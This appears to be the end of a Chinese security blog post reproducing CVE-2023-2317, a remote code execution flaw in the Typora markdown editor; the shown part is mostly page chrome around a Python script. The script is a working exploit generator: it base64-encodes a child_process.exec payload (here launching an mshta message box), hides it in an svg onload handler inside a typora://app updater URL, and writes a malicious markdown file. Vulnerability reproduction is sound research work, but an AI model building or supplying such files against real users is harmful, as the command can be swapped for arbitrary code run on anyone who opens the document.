+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># command = &#x27;&#x27;&#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># command1 = &#x27;&#x27;&#x27;calc&#x27;&#x27;&#x27; #弹出计算机命令</span></span><br><span class="line">command1 = <span class="string">&#x27;&#x27;&#x27;mshta vbscript:msgbox(&quot;I am hack&quot;,64,&quot;hackyou&quot;)(window.close)&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># command2 = &#x27;&#x27;&#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># payload = &#x27;&#x27;&#x27;reqnode(&#x27;child_process&#x27;).exec((&#123;Win64: \&#x27;&#x27;&#x27;&#x27;+command1+&#x27;&#x27;&#x27;\&#x27;, Linux: \&#x27;&#x27;&#x27;&#x27;+command2+&#x27;&#x27;&#x27;\&#x27;&#125;)[navigator.platform.substr(0,5)])&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;reqnode(&#x27;child_process&#x27;).exec(\&#x27;&#x27;&#x27;&#x27;</span>+command1+<span class="string">&#x27;&#x27;&#x27;\&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload_base64 = base64.b64encode(payload.encode()).decode()</span><br><span class="line">argument_raw = <span class="string">f&#x27;&#x27;&#x27;[&quot;&quot;,&quot;&lt;svg/onload=top.eval(atob(&#x27;<span class="subst">&#123;payload_base64&#125;</span>&#x27;))&gt;&lt;/svg&gt;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]&#x27;&#x27;&#x27;</span></span><br><span class="line">argument_urlencode = quote(argument_raw,safe=<span class="string">&quot;!*&#x27;();:@&amp;=+$,?%#[]&quot;</span>)</span><br><span class="line">final_exp = <span class="string">f&#x27;&#x27;&#x27;&lt;embed style=&quot;height:0;&quot; src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=<span class="subst">&#123;argument_urlencode&#125;</span>&quot;&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(final_exp)</span><br><span class="line">final_exp = final_exp + <span class="string">&#x27;\n\n&#x27;</span> + <span class="string">&#x27;```\ntest\n```\n&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test_exp.md&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(final_exp)</span><br></pre></td></tr></table></figure>
+
+
+
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/CVE/">#CVE</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/09/18/33%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B9%8B%E9%80%80%E5%BD%B9/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">碎碎念</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/09/07/31php-python%E7%BB%93%E5%90%88%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">php-python结合的一道题目</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2023-2317-%E3%80%90Typora-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E3%80%91"><span class="nav-text">漏洞复现：CVE-2023-2317 【Typora 远程代码执行漏洞】</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">lhb</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+
+</body>
+</html>
